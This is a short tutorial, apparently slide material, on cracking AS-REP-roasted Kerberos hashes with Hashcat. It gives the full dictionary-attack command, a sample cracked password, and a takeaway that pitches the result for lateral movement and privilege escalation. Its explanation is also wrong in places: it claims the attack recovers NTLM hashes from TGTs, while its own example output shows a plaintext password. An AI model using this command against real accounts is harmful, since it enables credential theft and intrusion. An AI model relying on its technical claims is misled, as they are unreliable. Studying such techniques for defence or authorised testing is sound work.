Cracking AS-REPRoasted Hashes Offline

Using Hashcat to reveal user NTLM hashes from collected TGTs.

Hashcat Command
hashcat -m 18200 -a 0 asreproast_hashes.txt /usr/share/wordlists/rockyou.txt
  • •-m 18200: Specifies the hash mode for AS-REPRoasted hashes.
  • •-a 0: Indicates a dictionary attack.
  • •asreproast_hashes.txt: The input file containing collected TGTs.
  • •/usr/share/wordlists/rockyou.txt: The wordlist for cracking.
Key Difference

AS-REPRoasting directly yields the user's NTLM hash, unlike Kerberoasting which yields the service account's NTLM hash.

Example Cracked Output
$krb5asrep$23$john.doe@CORP.LOCAL:Password123!
Common Mistake

Using the incorrect Hashcat mode (e.g., 13100 instead of 18200) for AS-REPRoasted hashes will result in failure.

Key Takeaway

Successful AS-REPRoasting provides direct user credentials, offering a powerful avenue for lateral movement and privilege escalation.
